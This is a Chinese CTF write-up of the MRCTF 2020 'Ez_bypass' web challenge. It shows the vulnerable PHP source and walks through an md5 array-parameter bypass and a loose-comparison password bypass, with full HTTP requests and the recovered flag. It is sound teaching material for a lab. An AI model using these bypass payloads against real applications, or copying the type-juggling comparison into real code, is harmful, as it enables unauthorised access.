---
title: MRCTF 2020 Ez_bypass
date: 2023-10-24
categories:
  - CTF
  - Web
---

## 前置工作

进入靶机网页，看到如下代码（已在观感上优化），发现这是一道非常简单的绕过题

```php
<?php
// I put something in F12 for you
include 'flag.php';
$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
if (isset($_GET['gg'])&&isset($_GET['id'])) {
    $id=$_GET['id'];
    $gg=$_GET['gg'];
    if (md5($id) === md5($gg) && $id !== $gg) {
        echo 'You got the first step';
        if (isset($_POST['passwd'])) {
            $passwd=$_POST['passwd'];
            if (!is_numeric($passwd)) {
                 if ($passwd==1234567) {
                     echo 'Good Job!';
                     highlight_file('flag.php');
                     die('By Retr_0');
                 } else {
                     echo "can you think twice??";
                 }
            } else {
                echo 'You can not get it !';
            }
        } else {
            die('only one way to get the flag');
        }
    } else {
        echo "You are not a real hacker!";
    }
} else {
    die('Please input first');
}
```

## MD5 绕过

观察代码 `md5($id) === md5($gg) && $id !== $gg`，通常我可能会想到 `0e` 漏洞，但是这里的 `md5($id) === md5($gg)` 是一个**强比较**，`0e` 漏洞其实行不通，所以我可以通过将 `id` 和 `gg` 定义成数组传入进去以绕过 MD5 的检测，以下是请求代码的一部分

```http
GET /?id[]=1&gg[]=2 HTTP/1.1
```

随后你就可以看到（下方回显已在观感上优化）

```
Warning: md5() expects parameter 1 to be string, array given in /var/www/html/index.php on line 48
Warning: md5() expects parameter 1 to be string, array given in /var/www/html/index.php on line 48

You got the first step
```

## `passwd` 绕过

这个非常简单，利用的就是字符串和数字的弱比较，既然他想要我的 `password` = `1234567` 并且不是数字，我只需要在传入的时候将 `password` 赋成 `1234567A` 即可，以下是最终的 Http 请求代码（别忘了 `passwd` 要 POST）

```http
POST /?id[]=1&gg[]=2 HTTP/1.1
Host: 1248334a-ce1e-4c57-b522-83b58653a081.node4.buuoj.cn:81
User-Agent: Apifox/1.0.0 (https://apifox.com)
Accept: */*
Host: 1248334a-ce1e-4c57-b522-83b58653a081.node4.buuoj.cn:81
Connection: keep-alive
Content-Length: 15

passwd=1234567A
```

最后即可得到我们的 Flag，是 `flag{e87c75a7-0ed4-4747-bcee-56b8e230a64a}`